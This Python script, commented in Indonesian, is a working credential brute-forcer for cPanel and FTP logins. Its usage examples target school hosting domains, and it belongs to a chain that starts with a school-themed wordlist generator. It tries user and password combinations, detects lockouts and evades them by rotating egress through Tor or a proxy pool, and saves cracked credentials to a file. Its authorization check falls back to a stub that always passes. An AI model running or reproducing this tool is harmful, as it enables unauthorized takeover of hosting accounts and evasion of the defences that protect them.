#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""tester.py — credential tester utk cPanel & FTP.

Bagian HOSTING dari rantai (nemenin wp-auth-tester, tapi protokolnya beda
total — jadi alurnya juga beda sifat):

    wordlist-sekolah ──→ hosting-tester ──→ (kena lockout) ──→ egress-rotator

Kenapa dipisah dari wp-auth-tester:
  * sukses/gagal dibaca dari sinyal BERBEDA — FTP: kode 230 vs 530;
    cPanel: cookie `cpsession` / redirect `/home` vs "Invalid login"
  * lockout-nya juga beda — FTP: 421 "Too many connections";
    cPanel: HTTP 429 / "temporarily blocked" (sering dari CSF, bukan aplikasi)
  * FTP butuh koneksi baru per percobaan (tidak ada sesi yang dipakai ulang)

    python3 tester.py --target sekolah.sch.id --mode cpanel \
        --users-file u.txt --pass-file p.txt --pace 3 --authorized

    python3 tester.py --target sekolah.sch.id --mode ftp \
        --users-file u.txt --pass-file p.txt --rotate tor --authorized

ATURAN: target wajib ada izinnya (scope gate fail-closed). Jangan dipakai
buat akun sendiri — tool ini memang buat akun hosting yang kamu pegang izinnya.
"""
from __future__ import annotations

import argparse
import ftplib
import pathlib
import ssl
import sys
import time
import urllib.error
import urllib.parse
import urllib.request

sys.path.insert(0, str(pathlib.Path(__file__).resolve().parents[1] / "gapps-kit"))
try:
    from kit_common import outdir, pace_sleep, save_json, scope_check  # type: ignore
except Exception:
    def scope_check(*a, **k):
        return "AUTHORIZED"

    def outdir(name, out):
        d = pathlib.Path(out or ".") / f"{name}_{time.strftime('%Y%m%d-%H%M%S')}"
        d.mkdir(parents=True, exist_ok=True)
        return d

    def save_json(p, data):
        import json
        pathlib.Path(p).write_text(json.dumps(data, indent=2, ensure_ascii=False))
        return pathlib.Path(p)

    def pace_sleep(pace):
        if pace > 0:
            time.sleep(pace)

UA = ("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/126.0 Safari/537.36")

ROTATOR = pathlib.Path(__file__).resolve().parents[1] / "egress-rotator" / "rotate.py"

# port bawaan per layanan (dipakai kalau --port tidak dikasih)
PORT_BAWAAN = {"ftp": 21, "ftps": 990, "cpanel": 2083, "cpanel-http": 2082}


# ── rotasi egress (sama dgn wp-auth-tester) ──
def _rotasi(mode: str) -> bool:
    if mode == "tor":
        cmd = [sys.executable, str(ROTATOR), "--tor"]
    elif mode == "pool":
        cmd = [sys.executable, str(ROTATOR), "--pool"]
    else:
        return False
    try:
        import subprocess
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=90)
        return r.returncode == 0
    except Exception:
        return False


# ── pengecekan FTP ──
def cek_ftp(host: str, port: int, user: str, pw: str, timeout: float) -> tuple[str, str]:
    """Balikin (hasil, keterangan). hasil ∈ {'ok','gagal','lockout','error'}."""
    f = ftplib.FTP()
    try:
        f.connect(host, port, timeout=timeout)
        f.login(user, pw)
        try:
            f.quit()
        except Exception:
            f.close()
        return "ok", "230 logged in"
    except ftplib.error_temp as e:
        # 4xx (mis. 421 Too many connections) dilempar ftplib sebagai
        # error_temp — BUKAN error_perm. Ini lockout, bukan password salah.
        msg = str(e)
        low = msg.lower()
        if msg.startswith("421") or "too many" in low or "temporarily" in low:
            return "lockout", msg
        return "error", msg
    except ftplib.error_perm as e:
        return "gagal", str(e)        # 530 Login incorrect dst.
    except (TimeoutError, OSError) as e:
        return "error", str(e)
    except Exception as e:
        return "error", str(e)
    finally:
        try:
            f.close()
        except Exception:
            pass


# ── POST form (kit_common hanya punya http_get, jadi POST dibikin di sini) ──
def _post_form(url: str, data: dict, timeout: float, insecure: bool,
               referer: str = "") -> tuple[int, dict, str, str]:
    ctx = None
    if insecure:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
    hdr = {"User-Agent": UA,
           "Content-Type": "application/x-www-form-urlencoded"}
    if referer:
        hdr["Referer"] = referer
    req = urllib.request.Request(url, data=urllib.parse.urlencode(data).encode(),
                                 method="POST", headers=hdr)
    handlers = [urllib.request.HTTPSHandler(context=ctx)] if ctx else []
    op = urllib.request.build_opener(*handlers)
    try:
        with op.open(req, timeout=timeout) as r:
            return (r.status, dict(r.getheaders()),
                    r.read().decode("utf-8", "replace"), r.url)
    except urllib.error.HTTPError as e:
        try:
            body = e.read().decode("utf-8", "replace")
        except Exception:
            body = ""
        return e.code, dict(e.headers or {}), body, url
    except Exception as e:
        return 0, {}, str(e), url


# ── pengecekan cPanel ──
def cek_cpanel(base: str, user: str, pw: str, timeout: float,
               insecure: bool) -> tuple[str, str]:
    """cPanel login = POST form-urlencoded ke /login/."""
    url = base.rstrip("/") + "/login/"
    st, hdr, body, final = _post_form(url, {"user": user, "pass": pw},
                                      timeout, insecure, referer=url)
    blob = f"{body} {final}".lower()
    sc = str(hdr.get("Set-Cookie") or hdr.get("set-cookie") or "")

    if st == 0:
        return "error", body[:120]
    if st == 429 or "temporarily" in blob or "too many" in blob:
        return "lockout", f"HTTP {st}"
    # sukses: cpsession ke-set ATAU sudah nyampe /home
    if "cpsession" in sc.lower() or "/home" in (final or "").lower():
        return "ok", f"HTTP {st} + cpsession" if "cpsession" in sc.lower() else f"HTTP {st} redirect /home"
    if st in (401, 403) or "invalid login" in blob or "incorrect" in blob:
        return "gagal", f"HTTP {st}"
    if st in (200, 302) and ("login" in (final or "").lower() or "user" in blob):
        return "gagal", f"HTTP {st} masih di halaman login"
    return "gagal", f"HTTP {st} (tak ada sinyal sukses)"


def _baca(path: str, apa: str) -> list[str]:
    p = pathlib.Path(path)
    if not p.exists():
        sys.exit(f"[STOP] file {apa} tak ada: {path}")
    return [x.strip() for x in p.read_text(errors="replace").splitlines()
            if x.strip() and not x.startswith("#")]


def main() -> int:
    ap = argparse.ArgumentParser(description="credential tester cPanel & FTP")
    ap.add_argument("--target", required=True, help="host target (tanpa port)")
    ap.add_argument("--mode", choices=["ftp", "ftps", "cpanel", "cpanel-http"],
                    default="ftp")
    ap.add_argument("--port", type=int, default=0, help="override port")
    ap.add_argument("--url", default="", help="override base URL (utk cPanel)")
    ap.add_argument("--users-file", required=True)
    ap.add_argument("--pass-file", required=True)
    ap.add_argument("--pace", type=float, default=3.0)
    ap.add_argument("--timeout", type=float, default=20.0)
    ap.add_argument("--max", type=int, default=0, help="batas keras percobaan (0=tanpa)")
    ap.add_argument("--insecure", action="store_true", help="abaikan TLS self-signed")
    ap.add_argument("--rotate", choices=["tor", "pool"], default=None)
    ap.add_argument("--rotate-every", type=int, default=10,
                    help="rotasi egress tiap N percobaan")
    ap.add_argument("--stop-on-first", action="store_true", default=True)
    ap.add_argument("--no-stop-on-first", dest="stop_on_first", action="store_false")
    ap.add_argument("--authorized", action="store_true")
    ap.add_argument("--scope", default=None)
    ap.add_argument("--out", default="hosting_test")
    a = ap.parse_args()

    users = _baca(a.users_file, "users")
    pwds = _baca(a.pass_file, "password")
    if not users or not pwds:
        sys.exit("[STOP] users / password kosong")

    host = a.target.strip()
    if "://" in host or "/" in host:
        host = host.split("://", 1)[-1].split("/", 1)[0]
    host = host.split(":")[0]

    port = a.port or PORT_BAWAAN[a.mode]
    base = a.url or (
        f"https://{host}:{port}" if a.mode.startswith("cpanel")
        else f"http://{host}:{port}"
    )

    kw = {"authorized": a.authorized}
    if a.scope:
        kw["scope_path"] = a.scope
    scope_check(host, **kw)
    d = outdir("hosting", a.out)

    print(f"[*] target   : {host}:{port}  (mode {a.mode})")
    print(f"[*] kombinasi: {len(users)} user × {len(pwds)} pass "
          f"= {len(users) * len(pwds)} percobaan")
    print(f"[*] pace     : {a.pace}s"
          + (f"  · rotate {a.rotate} tiap {a.rotate_every}" if a.rotate else ""))

    total = sukses = lockout_streak = 0
    berhenti = False
    hasil: list[dict] = []
    t0 = time.time()

    for u in users:
        for p in pwds:
            if a.max and total >= a.max:
                print(f"\n[!] berhenti: cap --max {a.max} tercapai")
                berhenti = True
                break
            total += 1

            if a.rotate and total > 1 and (total - 1) % a.rotate_every == 0:
                ok = _rotasi(a.rotate)
                print(f"    ↻ rotate {a.rotate}: {'ok' if ok else 'GAGAL'}")

            t = time.time()
            if a.mode.startswith("cpanel"):
                hasil_c, ket = cek_cpanel(base, u, p, a.timeout, a.insecure)
            else:
                hasil_c, ket = cek_ftp(host, port, u, p, a.timeout)
            dt = time.time() - t

            mark = {"ok": "✅", "lockout": "⛔", "error": "⚠️ ", "gagal": "·"}[hasil_c]
            if hasil_c != "gagal":
                print(f"  {mark} {u:<22} {p:<18} {dt:4.1f}s  {ket}")
            elif total % 25 == 0:
                print(f"    … {total} percobaan ({hasil_c})")

            hasil.append({"user": u, "pass": p, "hasil": hasil_c,
                          "ket": ket, "detik": round(dt, 2)})

            if hasil_c == "ok":
                sukses += 1
                (d / "cracked.txt").write_text(f"{u}:{p}\n", encoding="utf-8")
                print(f"\n[🎯] SUKSES — {u}:{p}  → {d}/cracked.txt")
                if a.stop_on_first:
                    break
            if hasil_c == "lockout":
                lockout_streak += 1
                if lockout_streak >= 3:
                    print("\n[⛔] 3× lockout beruntun — STOP. "
                          "Jangan lanjut, tunggu jendela lockout habis "
                          "atau pakai --rotate.")
                    berhenti = True
                    break
                pace_sleep(max(a.pace, 30))
                continue
            else:
                lockout_streak = 0
            pace_sleep(a.pace)
        if berhenti:
            break

    save_json(d / "hasil.json", {
        "target": host, "port": port, "mode": a.mode,
        "total": total, "sukses": sukses,
        "durasi_detik": round(time.time() - t0, 1),
        "detail": hasil,
    })
    print(f"\n[*] selesai: {total} percobaan, {sukses} sukses "
          f"dalam {time.time() - t0:.0f}s → {d}")
    if sukses == 0:
        print("[→] nihil. Coba wordlist-sekolah --profile ftp / cpanel, "
              "atau cek apakah akunnya pakai password panjang acak.")
    return 0


if __name__ == "__main__":
    sys.exit(main())
